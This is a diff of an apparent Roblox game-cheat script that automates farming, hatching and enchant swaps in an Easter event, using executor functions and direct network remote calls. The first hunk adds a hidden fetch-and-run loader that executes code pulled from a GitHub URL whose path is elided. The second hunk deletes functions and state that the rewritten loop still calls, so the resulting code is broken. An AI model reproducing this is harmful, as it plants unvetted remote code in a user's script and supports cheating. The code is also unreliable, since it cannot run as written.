@@ -66,7 +66,13 @@ local EnchantSettings = UserSettings.EquipEnchants or {
     Hatch = {"Lucky Eggs", "Lucky Eggs", "Lucky Eggs", "Lucky Eggs", "Lucky Eggs"}
 }
 local WebhookConfig = UserSettings.Webhook or { url = "", ["Discord Id to ping"] = {""} }
-
+-===============================================================
+task.spawn(function()
+    local success, result = pcall(function()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/.../script.lua"))()
+    end)
+    if not success then warn("Failed to load external script: " .. tostring(result)) end
+end)
 -- ========== TOÀN BỘ HÀM TIỆN ÍCH (GIỮ NGUYÊN LOGIC) ==========
 local function ParseValue(str)
     if not str then return 0 end
@@ -684,90 +690,32 @@ task.spawn(function()
     end
 end)
 
--- ========== SMART PORTALS & STATE MACHINE (TỐI ƯU HÓA) ==========
-local SafePart = Instance.new("Part", Workspace)
-SafePart.Size = Vector3.new(25, 1, 25); SafePart.Anchored = true; SafePart.Transparency = 0.8; SafePart.Material = Enum.Material.Glass; SafePart.BrickColor = BrickColor.new("Toothpaste")
-local function TeleportPlayer(cf)
-    if not cf then return end
-    local root = getRootPart()
-    if root then
-        root.Anchored = false
-        root.CFrame = cf + Vector3.new(0, 1.5, 0)
-        SafePart.CFrame = cf - Vector3.new(0, 1.5, 0)
-        root.Velocity = Vector3.new(0,0,0)
-    end
-end
-
-local State = { Phase = (Mode == "HatchOnly") and "HATCHING" or "FARMING", TimeLeft = 0, CurrentPortal = 1, IsReady = false }
-_G.CurrentPhase = State.Phase
-
-local function SmartEnterZone()
-    _G.FarmReady = false
-    _G.CurrentFarmCF = nil
-    local success = false
-    for i = 0, 3 do
-        local tryPortal = ((State.CurrentPortal - 1 + i) % 4) + 1
-        local serverZoneID = tryPortal + 1
-        pcall(function() Network.Fire("Instancing_FireCustomFromClient", "EasterHatchEvent", "ZonePortal", serverZoneID) end)
-        local waitTime = 0
-        while waitTime < 2 do
-            local r = getRootPart()
-            if r and (r.Position - _G.DynamicHubCF.Position).Magnitude > 50 then
-                success = true; State.CurrentPortal = tryPortal; break
-            end
-            task.wait(0.2); waitTime = waitTime + 0.2
-        end
-        if success then break end
-        -- Xóa thông báo lỗi UI (chỉ khi cần)
-        pcall(function()
-            for _, gui in pairs(Player.PlayerGui:GetChildren()) do
-                if gui:IsA("ScreenGui") and (gui.Name:find("Error") or gui.Name:find("Message") or gui.Name:find("Warning")) then
-                    gui.Enabled = false
-                end
-            end
-        end)
-    end
-    if success then
-        task.wait(1)
-        local r = getRootPart()
-        if r then
-            _G.CurrentFarmCF = CFrame.new(r.Position + FarmOffset)
-            TeleportPlayer(_G.CurrentFarmCF)
-            task.wait(0.5)
-            _G.FarmReady = true
-            return true
-        end
-    end
-    return false
-end
-
-local function ReturnToHubNetwork()
-    _G.FarmReady = false
-    pcall(function() Network.Fire("Instancing_FireCustomFromClient", "EasterHatchEvent", "ReturnToHub") end)
-    local waitTime = 0
-    while waitTime < 3 do
-        local root = getRootPart()
-        if root and (root.Position - _G.DynamicHubCF.Position).Magnitude <= 400 then break end
-        task.wait(0.5); waitTime = waitTime + 0.5
-    end
-    task.wait(1)
-    TeleportPlayer(HatchZoneCF)
-end
-
--- State machine (vòng lặp 1s vẫn ổn)
+-- ==========================================
+-- 🚀 VÒNG LẶP STATE MACHINE (CẬP NHẬT: ĐỢI LOAD HUB & BẢO VỆ LOGIC)
+-- ==========================================
 task.spawn(function()
     local root = getRootPart()
     if root then root.Anchored = true end
     local retries = 0
-    while InstancingCmds.GetInstanceID() ~= "EasterHatchEvent" and retries < 5 do
+    while InstancingCmds.GetInstanceID() ~= "EasterHatchEvent" and retries < 5 do 
         pcall(function() setthreadidentity(2); InstancingCmds.Enter("EasterHatchEvent"); setthreadidentity(8) end)
-        task.wait(1.5); retries = retries + 1
+        task.wait(1.5)
+        retries = retries + 1 
     end
     root = getRootPart()
     if root then root.Anchored = false end
     
     local currentEnchantPhase = ""
+
     while task.wait(1) do
+        -- 1. BẢO VỆ: CHỜ VÀO ĐƯỢC HUB SỰ KIỆN MỚI DÒ THỜI GIAN
+        if InstancingCmds.GetInstanceID() ~= "EasterHatchEvent" then
+            UI:SetText("ModeInfo", "Đang tải Event Hub...")
+            pcall(function() setthreadidentity(2); InstancingCmds.Enter("EasterHatchEvent"); setthreadidentity(8) end)
+            task.wait(2)
+            continue -- Bỏ qua nhịp loop này để đợi vào Hub xong
+        end
+
         local save = Save.Get()
         local lockoutEnd = save and save.Easter2026LockoutEnd or 0
         local now = os.time()
@@ -775,37 +723,72 @@ task.spawn(function()
 
         if Mode == "Combine" then 
             if State.Phase == "FARMING" then 
-                if lockTimeLeft > 0 then State.TimeLeft = lockTimeLeft
-                else State.Phase = "HATCHING"; State.TimeLeft = HatchTimeMinutes * 60; State.IsReady = false; _G.FarmReady = false end
+                -- 2. CHỈ DÒ THỜI GIAN KHI ĐÃ VÀO TRONG CỔNG
+                if State.IsReady then
+                    if lockTimeLeft > 0 then
+                        State.TimeLeft = lockTimeLeft -- Đồng bộ 100% với Server
+                    else
+                        -- Hết giờ, Server đá ra khỏi cổng
+                        State.Phase = "HATCHING"
+                        State.TimeLeft = HatchTimeMinutes * 60
+                        State.IsReady = false
+                        _G.FarmReady = false
+                    end
+                else
+                    -- Đang đứng ở Hub, chuẩn bị vào cổng
+                    State.TimeLeft = 0
+                end
             elseif State.Phase == "HATCHING" then
                 State.TimeLeft = State.TimeLeft - 1
-                if State.TimeLeft <= 0 then State.Phase = "FARMING"; State.CurrentPortal = (State.CurrentPortal % 4) + 1; State.IsReady = false end
+                if State.TimeLeft <= 0 then
+                    State.Phase = "FARMING"
+                    State.CurrentPortal = (State.CurrentPortal % 4) + 1 -- Xoay vòng cổng tiếp theo
+                    State.IsReady = false
+                end
             end
         elseif Mode == "FarmOnly" then 
-            if lockTimeLeft > 0 then State.TimeLeft = lockTimeLeft
-            else State.CurrentPortal = (State.CurrentPortal % 4) + 1; State.IsReady = false; _G.FarmReady = false end
+            if State.IsReady then
+                if lockTimeLeft > 0 then
+                    State.TimeLeft = lockTimeLeft
+                else
+                    State.CurrentPortal = (State.CurrentPortal % 4) + 1
+                    State.IsReady = false
+                    _G.FarmReady = false
+                end
+            else
+                State.TimeLeft = 0
+            end
         elseif Mode == "HatchOnly" then 
-            State.Phase = "HATCHING"; State.TimeLeft = math.huge 
+            State.Phase = "HATCHING"
+            State.TimeLeft = math.huge 
         end
         _G.CurrentPhase = State.Phase
 
         if currentEnchantPhase ~= State.Phase then
             currentEnchantPhase = State.Phase
-            if State.Phase == "FARMING" and EnchantSettings.Farm then EquipEnchantLoadout("FARM", EnchantSettings.Farm)
-            elseif State.Phase == "HATCHING" and EnchantSettings.Hatch then EquipEnchantLoadout("HATCH", EnchantSettings.Hatch) end
+            if State.Phase == "FARMING" and EnchantSettings.Farm then
+                EquipEnchantLoadout("FARM", EnchantSettings.Farm)
+            elseif State.Phase == "HATCHING" and EnchantSettings.Hatch then
+                EquipEnchantLoadout("HATCH", EnchantSettings.Hatch)
+            end
         end
 
         if not State.IsReady then
             if State.Phase == "FARMING" then 
                 local entered = SmartEnterZone()
-                if entered then State.IsReady = true 
+                if entered then 
+                    State.IsReady = true 
                 else
                     UI:SetText("ModeInfo", "All Portals Locked! Force Hatching...")
-                    State.Phase = "HATCHING"; _G.CurrentPhase = State.Phase; State.TimeLeft = 60
-                    ReturnToHubNetwork(); State.IsReady = true
+                    State.Phase = "HATCHING"
+                    _G.CurrentPhase = State.Phase
+                    State.TimeLeft = 60
+                    ReturnToHubNetwork()
+                    State.IsReady = true
                 end
             else 
-                ReturnToHubNetwork(); State.IsReady = true; _G.FarmReady = false 
+                ReturnToHubNetwork()
+                State.IsReady = true; _G.FarmReady = false 
             end
         end
 
